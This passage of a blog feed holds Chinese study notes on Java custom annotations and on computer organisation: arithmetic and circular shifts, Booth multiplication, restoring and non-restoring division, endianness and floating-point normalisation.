punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ElementType</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Retention</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RetentionPolicy</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Target</span></span><span class="token punctuation">;</span><span class="token comment">/** * 描述需要去执行的类名，和方法名 */</span><span class="token annotation punctuation">@Target</span><span class="token punctuation">(</span><span class="token class-name">ElementType</span><span class="token punctuation">.</span>TYPE<span class="token punctuation">)</span><span class="token annotation punctuation">@Retention</span><span class="token punctuation">(</span><span class="token class-name">RetentionPolicy</span><span class="token punctuation">.</span>RUNTIME<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token annotation punctuation">@interface</span> <span class="token class-name">Pro</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> <span class="token function">className</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> <span class="token function">methodName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="34-小结"><a class="markdownIt-Anchor" href="#34-小结">#</a> 3.4 小结</h2><ol><li>以后大多数时候会使用注解，而不是自定义注解</li><li>注解给谁用？<ol><li>编译器</li><li>给解析程序用</li></ol></li><li>注解不是程序的一部分，可以理解为注解就是一个标签</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-junit单元测试&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-junit单元测试&quot;&gt;#&lt;/a&gt; 1、junit 单元测试&lt;/h1&gt;
&lt;h2 id=&quot;11-测试分类&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; </summary>
      
    
    
    
    <category term="JavaWeb" scheme="http://example.com/categories/JavaWeb/"/>
    
    
    <category term="JavaWeb" scheme="http://example.com/tags/JavaWeb/"/>
    
  </entry>
  
  <entry>
    <title>计算机组成原理-数据的表示和运算-2</title>
    <link href="http://example.com/post/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E8%BF%90%E7%AE%97-2.html"/>
    <id>http://example.com/post/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E8%BF%90%E7%AE%97-2.html</id>
    <published>2022-06-12T00:58:10.000Z</published>
    <updated>2022-06-12T07:43:58.840Z</updated>
    
    <content type="html"><![CDATA[<h2 id="移位运算"><a class="markdownIt-Anchor" href="#移位运算">#</a> 移位运算</h2><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612091441213.png" alt="image-20220612091441213"></p><h3 id="算数移位"><a class="markdownIt-Anchor" href="#算数移位">#</a> 算数移位</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612091509237.png" alt="image-20220612091509237"></p><ul><li>移动小数点相当于改变每个位的位权</li><li>移位：通过改变各个数码位和小数点的相对位置，从而改变各个数码位的位权。可以用移位运算实现乘法、除法</li></ul><h4 id="原码的算数移位"><a class="markdownIt-Anchor" href="#原码的算数移位">#</a> 原码的算数移位</h4><p><strong>原码</strong>的算数移位：符号位保持不变，仅对数值位进行移位</p><p>右移：高位补 0，低位舍弃，若舍弃的位等于 0，则相当于除以 2，若舍弃的位不等于 0，则会<strong>丢失精度</strong></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612091854920.png" alt="image-20220612091854920"></p><p>左移：低位补 0，高位舍弃，若舍弃的位等于 0，则相当于 ×2，若舍弃的位不等于 0，则会出现<strong>严重误差</strong></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612092040274.png" alt="image-20220612092040274"></p><p>原码表示的定点小数与定点整数一个效果</p><h4 id="反码的算数移位"><a class="markdownIt-Anchor" href="#反码的算数移位">#</a> 反码的算数移位</h4><p>正数的反码移位：正数的反码与原码的表示一模一样，因此正数不论是左移还是右移，表示方法都与原码一样</p><p>负数的反码移位</p><ul><li>反码尾数部分和原码是完全相反的，</li><li>右移：高位补 1，低位舍弃</li><li>左移：低位补 1，高位舍弃</li></ul><h4 id="补码的算数移位"><a class="markdownIt-Anchor" href="#补码的算数移位">#</a> 补码的算数移位</h4><p>正数的补码移位：正数的补码与原码的表示一模一样，因此正数不论是左移还是右移，表示方法都与原码一样</p><p>负数的补码移位</p><ul><li>补码是从反码的基础上末位 + 1 得到的</li><li>补码的规律为：从右往左到第一个 1 为止，后半部分与原码相同，前半部分和反码相同</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612092435504.png" alt="image-20220612092435504"></p><ul><li>右移：高位补 1，低位舍弃</li><li>左移：低位补 0，高位舍弃</li></ul><h4 id="算数移位总结"><a class="markdownIt-Anchor" href="#算数移位总结">#</a> 算数移位总结</h4><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612092734964.png" alt="image-20220612092734964"></p><h4 id="算数移位的应用举例"><a class="markdownIt-Anchor" href="#算数移位的应用举例">#</a> 算数移位的应用举例</h4><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612092859987.png" alt="image-20220612092859987"></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612093100771.png" alt="image-20220612093100771"></p><h3 id="循环移位"><a class="markdownIt-Anchor" href="#循环移位">#</a> 循环移位</h3><p>在循环移位的时候整个二进制字符串是进行循环补位的</p><ul><li>循环左移</li><li>带进位位的循环左移</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612093301410.png" alt="image-20220612093301410"></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612093420410.png" alt="image-20220612093420410"></p><p>循环移位的操作很适合把一个数字的低字节和高字节进行调换</p><h3 id="知识点回顾"><a class="markdownIt-Anchor" href="#知识点回顾">#</a> 知识点回顾</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612093457421.png" alt="image-20220612093457421"></p><h2 id="定点数原码乘法运算"><a class="markdownIt-Anchor" href="#定点数原码乘法运算">#</a> 定点数原码乘法运算</h2><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612093540527.png" alt="image-20220612093540527"></p><p>手算乘法（十进制）</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612093701093.png" alt="image-20220612093701093"></p><p>手算乘法（二进制）</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612093901732.png" alt="image-20220612093901732"></p><p>考虑用及其实现：</p><ul><li>实际数字有正负，符号位如何处理？</li><li>乘积的位数扩大一倍，如何处理？</li><li>4 个位积都要保存下来最后统一相加？</li></ul><h3 id="原码一位乘法"><a class="markdownIt-Anchor" href="#原码一位乘法">#</a> 原码一位乘法</h3><p>符号位单独处理：符号位等于 x 的符号位异或 y 的符号位</p><p>数值位取绝对值进行乘法计算</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612094309832.png" alt="image-20220612094309832"></p><ul><li>MQ 存放乘数和积的低位</li><li>X 里存放被乘数</li><li>ACC 存放乘积高位</li><li>如果 MQ 的最低位为 1，ACC 就加上 X 中的值，如果 MQ 的最低位为 0，就不进行相加</li><li>相加结束之后 ACC 和 MQ 整体右移一位，循环上述操作</li><li>乘数的符号位不用参与运算</li><li>小数点隐含在积的符号位的右边</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612094735002.png" alt="image-20220612094735002"></p><h3 id="原码一位乘法手算模拟"><a class="markdownIt-Anchor" href="#原码一位乘法手算模拟">#</a> 原码一位乘法（手算模拟）</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612095005360.png" alt="image-20220612095005360"></p><p>原码整数的乘法与小数的运算方法是一致的，注意一下小数点的位置即可</p><h2 id="定点数补码的乘法运算"><a class="markdownIt-Anchor" href="#定点数补码的乘法运算">#</a> 定点数补码的乘法运算</h2><h3 id="补码的一位乘法"><a class="markdownIt-Anchor" href="#补码的一位乘法">#</a> 补码的一位乘法</h3><p>设机器字长为 5 位（含符号位，n=4），x=-0.1101, y=+0.1011，采用 Booth 算法求 x・y</p><p><strong>原码一位乘法</strong></p><ul><li>进行 n 轮加法、移位</li><li>每轮可能加 x 绝对值，可能加 0，具体要看 MQ 的最低位的值</li><li>每次移位是 “逻辑右移”</li><li>符号位不参与运算</li></ul><p><strong>补码一位乘法</strong></p><ul><li>进行 n 论加法、移位，<strong>最后再多来一次加法</strong></li><li>可能加 0，可能加 [x] 补，可能加 [-x] 补，根据当前 MQ 的最低位和辅助位来确定加什么<ul><li>辅助位 - MQ 中最低位 = 1 时，(ACC)+[X] 补</li><li>辅助位 - MQ 中最低位 = 0 时，(ACC)+0</li><li>辅助位 - MQ 中最低位 =-1 时，(ACC)+[-X] 补</li></ul></li><li>每次移位是 “补码的算数右移”—— 算数右移：<strong>符号位保持不动，数字右移</strong></li><li>符号位参与运算</li></ul><p>补码的一位乘法（手算模拟）</p><p>MQ 需要多一位做辅助位，辅助位初始为 0，每次右移会使 MQ 的最低位顶替原本的辅助位，随之 ACC 和 X 都是双符号位</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612100052150.png" alt="image-20220612100052150"></p><h2 id="定点数原码除法运算"><a class="markdownIt-Anchor" href="#定点数原码除法运算">#</a> 定点数原码除法运算</h2><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612101148749.png" alt="image-20220612101148749"></p><h3 id="手算除法十进制"><a class="markdownIt-Anchor" href="#手算除法十进制">#</a> 手算除法（十进制）</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612101517616.png" alt="image-20220612101517616"></p><p>手算除法（二进制）</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612101848739.png" alt="image-20220612101848739"></p><h3 id="原码除法恢复余数法"><a class="markdownIt-Anchor" href="#原码除法恢复余数法">#</a> 原码除法：恢复余数法</h3><p>符号位单独处理：被除数和除数的符号位异或</p><p>数值拉取绝对值进行除法计算</p><p>写出 x,y 的原码，y 的补码，[-y] 补</p><ul><li><p>每次上商的时候默认会商 1，然后会把 ACC 和通用寄存器的值相减后的结果再放回 ACC 中（(ACC)+[-y] 补），如果减法运算之后符号位为 1，说明此时余数小于除数，应该商 0 的，之后计算机再将上商的值改为 0，这时 ACC 的值已经放了之前的负数，要在返回原样，就要再加上除数 [y] 补，再次覆盖 ACC</p></li><li><p>把 ACC 和 MQ 的内容全部左移一位，进行一个错位，重复上述步骤</p></li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612103014428.png" alt="image-20220612103014428"></p><p>小数点默认在第一个 0 后面，余数 = 0.0111X2^{-n}，n=4</p><h3 id="原码除法恢复余数法手算"><a class="markdownIt-Anchor" href="#原码除法恢复余数法手算">#</a> 原码除法：恢复余数法（手算）</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612103403524.png" alt="image-20220612103403524"></p><h3 id="原码除法加减交替法不恢复余数法"><a class="markdownIt-Anchor" href="#原码除法加减交替法不恢复余数法">#</a> 原码除法：加减交替法（不恢复余数法）</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612103659376.png" alt="image-20220612103659376"></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612103926714.png" alt="image-20220612103926714"></p><p>思路：上商为 1 相减之后出现负数直接上商 0，然后逻辑左移，加 y 补</p><h2 id="定点数补码除法运算"><a class="markdownIt-Anchor" href="#定点数补码除法运算">#</a> 定点数补码除法运算</h2><h3 id="补码除法加减交替法"><a class="markdownIt-Anchor" href="#补码除法加减交替法">#</a> 补码除法：加减交替法</h3><ul><li>符号位直接参与运算，因此不用写绝对值的补码，直接写原数的补码</li><li>采用双符号位</li><li>被除数和除数同号，则被除数减去除数；异号则被除数加上除数</li><li>余数和除数同号，商 1，余数左移一位减去除数</li><li>余数和除数异号，商 0，余数左移一位加上除数</li><li>重复 n 次</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612104643534.png" alt="image-20220612104643534"></p><p>末位商恒置为 1</p><h2 id="除法运算总结回顾"><a class="markdownIt-Anchor" href="#除法运算总结回顾">#</a> 除法运算总结回顾</h2><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612104845577.png" alt="image-20220612104845577"></p><h2 id="c语言类型转换"><a class="markdownIt-Anchor" href="#c语言类型转换">#</a> C 语言类型转换</h2><p>C 语言中的定点整数，如 int short long 都是用<strong>补码</strong>存储的</p><p>unsigned 表示无符号整数</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612133529322.png" alt="image-20220612133529322"></p><h2 id="数据的存储和排列"><a class="markdownIt-Anchor" href="#数据的存储和排列">#</a> 数据的存储和排列</h2><h3 id="大小端模式"><a class="markdownIt-Anchor" href="#大小端模式">#</a> 大小端模式</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612142235582.png" alt="image-20220612142235582"></p><p>大端：将高有效字节放在低地址，适合人类阅读</p><p>小端：将高有效字节放在高地址，适合机器处理</p><h3 id="边界对齐"><a class="markdownIt-Anchor" href="#边界对齐">#</a> 边界对齐</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612142441722.png" alt="image-20220612142441722"></p><p>转换地址就逻辑左移右移即可，每次访存只能读取一个字，且不能跨行读取</p><h2 id="浮点数的表示"><a class="markdownIt-Anchor" href="#浮点数的表示">#</a> 浮点数的表示</h2><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612143258457.png" alt="image-20220612143258457"></p><p>定点数的局限性：当所需表示的数值较大时，定点数就不能正确表示</p><p>定点数可表示的数字范围有限，但我们不能无限制地增加数据的长度</p><p>科学计数法：+11+3.026</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612143558714.png" alt="image-20220612143558714"></p><p>尾数部分越短能表示的精度就越低，阶码表示对应进制的多少次方</p><ul><li>阶码反映数值的大小，尾数反映精度</li></ul><h3 id="浮点数的表示-2"><a class="markdownIt-Anchor" href="#浮点数的表示-2">#</a> 浮点数的表示</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612144203332.png" alt="image-20220612144203332"></p><ul><li>r: 进制，E：阶码；M：尾数</li></ul><h3 id="浮点数尾数的规格化"><a class="markdownIt-Anchor" href="#浮点数尾数的规格化">#</a> 浮点数尾数的规格化</h3><p>尾数的最高位如果是 0 就没有意义，是无效值，会丧失精度</p><p><strong>左规</strong>：当浮点数运算的结果为非规格化时要进行规格化处理，将<strong>尾数算数左移一位，阶码减 1</strong></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612144701482.png" alt="image-20220612144701482"></p><p><strong>右规</strong>：当浮点数运算结果的尾数出现溢出（双符号位为 01 或 10,）时，将<strong>尾数算数右移一位，阶码加 1</strong></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612145037770.png" alt="image-20220612145037770"></p><p>注：采用双符号位，当溢出发生时，可以挽救。更高的符号位是正确符号位</p><h3 id="规格化浮点数的特点"><a class="markdownIt-Anchor" href="#规格化浮点数的特点">#</a> 规格化浮点数的特点</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612145524638.png" alt="image-20220612145524638"></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220612145611648.png" alt="image-20220612145611648"></p><h2 id="浮点数标准ieee-754"><a class="markdownIt-Anchor" href="#浮点数标准ieee-754">#</a> 浮点数标准 IEEE 754</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;移位运算&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#移位运算&quot;&gt;#&lt;/a&gt; 移位运算&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-2</summary>
      
    
    
    
    <category term="计算机组成原理" scheme="http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="计算机组成原理" scheme="http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    <category term="408" scheme="http://example.com/tags/408/"/>
    
  </entry>
  
  <entry>
    <title>计算机组成原理-数据的表示和运算</title>
    <link href="http://example.com/post/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E8%BF%90%E7%AE%97.html"/>
    <id>http://example.com/post/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E6%95%B0%E6%8D%AE%E7%9A%84%E8%A1%A8%E7%A4%BA%E5%92%8C%E8%BF%90%E7%AE%97.html</id>
    <published>2022-06-11T03:21:41.000Z</published>
    <updated>2022-06-12T01:14:21.045Z</updated>
    
    <content type="html"><![CDATA[<h2 id="无符号整数的表示和运算"><a class="markdownIt-Anchor" href="#无符号整数的表示和运算">#</a> 无符号整数的表示和运算</h2><h3 id="无符号整数的加法"><a class="markdownIt-Anchor" href="#无符号整数的加法">#</a> 无符号整数的加法</h3><p>按位相加</p><h3 id="无符号整数的减法"><a class="markdownIt-Anchor" href="#无符号整数的减法">#</a> 无符号整数的减法</h3><ol><li>被减数不变，减数全部按位取反，末位 + 1，减法变加法</li><li>从最低位开始，<strong>按位相加</strong>，并往更高位进位</li></ol><h2 id="带符号整数的表示和运算-原反补"><a class="markdownIt-Anchor" href="#带符号整数的表示和运算-原反补">#</a> 带符号整数的表示和运算 - 原反补</h2><h3 id="补码的加法运算"><a class="markdownIt-Anchor" href="#补码的加法运算">#</a> 补码的加法运算</h3><p>当负数参与加法运算时，要将两个数全部取补码，符号位也参与运算，不需要单独处理</p><h3 id="补码的减法运算"><a class="markdownIt-Anchor" href="#补码的减法运算">#</a> 补码的减法运算</h3><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>A</mi><msub><mo stretchy="false">]</mo><mtext>补</mtext></msub><mo>−</mo><mo stretchy="false">[</mo><mi>B</mi><msub><mo stretchy="false">]</mo><mtext>补</mtext></msub><mo>=</mo><mo stretchy="false">[</mo><mi>A</mi><msub><mo stretchy="false">]</mo><mtext>补</mtext></msub><mo>+</mo><mo stretchy="false">[</mo><mo>−</mo><mi>B</mi><msub><mo stretchy="false">]</mo><mtext>补</mtext></msub></mrow><annotation encoding="application/x-tex">[A]_补-[B]_补=[A]_补+[-B]_补</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">A</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord cjk_fallback mtight">补</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord cjk_fallback mtight">补</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">A</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord cjk_fallback mtight">补</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord cjk_fallback mtight">补</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mi>B</mi><msub><mo stretchy="false">]</mo><mtext>补</mtext></msub></mrow><annotation encoding="application/x-tex">[B]_补</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord cjk_fallback mtight">补</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>转<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><mi>B</mi><msub><mo stretchy="false">]</mo><mtext>补</mtext></msub></mrow><annotation encoding="application/x-tex">[-B]_补</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose"><span class="mclose">]</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord cjk_fallback mtight">补</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>：全部位按位取反（包括符号位），末位加 1</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611112652422.png" alt="image-20220611112652422"></p><p>或者：找第一个 1，左边全部取反，右边不变</p><p><strong>例 1</strong>：19-19</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611112953017.png" alt="image-20220611112953017"></p><p><strong>C 语言中 int 等带符号整数是用补码来表示的</strong></p><h3 id="原反补码特性对比"><a class="markdownIt-Anchor" href="#原反补码特性对比">#</a> 原 / 反 / 补码特性对比</h3><p>小题常见考点</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611113453517.png" alt="image-20220611113453517"></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611113510474.png" alt="image-20220611113510474"></p><p>原码和反码的合法表示范围完全相同，都有两种方法表示真值 0；</p><p><strong>补码</strong>的合法表示范围比原码多一个负数，只有一种方式表示真值 0：</p><ul><li>如果有 8 个比特，原码和反码能够表示 - 127~127，补码可以表示 - 128~127</li><li>补码中 - 128 的表示为：1,0000000；</li><li>原码能表示的最小的值 - 127：1,1111111；</li><li>-128 不能转为 - 127</li><li>补码的真值 0 表示方法：0,0000000</li></ul><p>常见考点：A 和 B 进行某种运算后，<strong>是否发生溢出</strong> —— 手算做题可以带入十进制验证是否超出合法范围</p><h3 id="移码表示"><a class="markdownIt-Anchor" href="#移码表示">#</a> 移码表示</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611215129431.png" alt="image-20220611215129431"></p><p>移码：在<strong>补码</strong>的基础上<strong>符号位取反就是移码</strong>，移码只能用来表示整数</p><p>移码的合法表示范围和补码相同，也只能有一种表示真值 0 的形式，[0] 移 = 10000000</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611215355189.png" alt="image-20220611215355189"></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611215414718.png" alt="image-20220611215414718"></p><h2 id="定点小数的表示和运算"><a class="markdownIt-Anchor" href="#定点小数的表示和运算">#</a> 定点小数的表示和运算</h2><p>定点：小数点的符号固定</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611215542709.png" alt="image-20220611215542709"></p><h3 id="定点小数反码-补码的转换"><a class="markdownIt-Anchor" href="#定点小数反码-补码的转换">#</a> 定点小数反码、补码的转换</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611215716021.png" alt="image-20220611215716021"></p><h3 id="定点小数的加减运算"><a class="markdownIt-Anchor" href="#定点小数的加减运算">#</a> 定点小数的加 / 减运算</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611215735571.png" alt="image-20220611215735571"></p><h3 id="定点小数与定点整数的区别"><a class="markdownIt-Anchor" href="#定点小数与定点整数的区别">#</a> 定点小数与定点整数的区别</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611215815635.png" alt="image-20220611215815635"></p><p>定点小数在位数扩展时，<strong>拓展位置</strong>不一样，要加在右边</p><p>定点小数带符号与不带符号的加法减法与定点整数一样</p><h2 id="奇偶校验码"><a class="markdownIt-Anchor" href="#奇偶校验码">#</a> 奇偶校验码</h2><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611220446249.png" alt="image-20220611220446249"></p><p><img src="C:/Users/a1072/AppData/Roaming/Typora/typora-user-images/image-20220611220742364.png" alt="image-20220611220742364"></p><h2 id="算术逻辑单元alu"><a class="markdownIt-Anchor" href="#算术逻辑单元alu">#</a> 算术逻辑单元 ALU</h2><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611220827090.png" alt="image-20220611220827090"></p><ul><li>算术运算：加减乘除等</li><li>逻辑运算：与或非异或等</li><li>辅助功能：移位、求补等</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611220948204.png" alt="image-20220611220948204"></p><h3 id="最基本的逻辑运算"><a class="markdownIt-Anchor" href="#最基本的逻辑运算">#</a> 最基本的逻辑运算</h3><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611221246766.png" alt="image-20220611221246766"></p><p>在一个复杂的逻辑表达式中，<strong>与运算的优先级大于或运算的优先级</strong> —— 类比乘法和加法，先算与再算减，且与或运算也符合下面规律</p><ul><li>A (C+D) = AC + AD —— 分配率</li><li>ABC = A (BC) —— 结合律</li><li>A + B + C = A + (B + C) —— 结合律</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220611221708902.png" 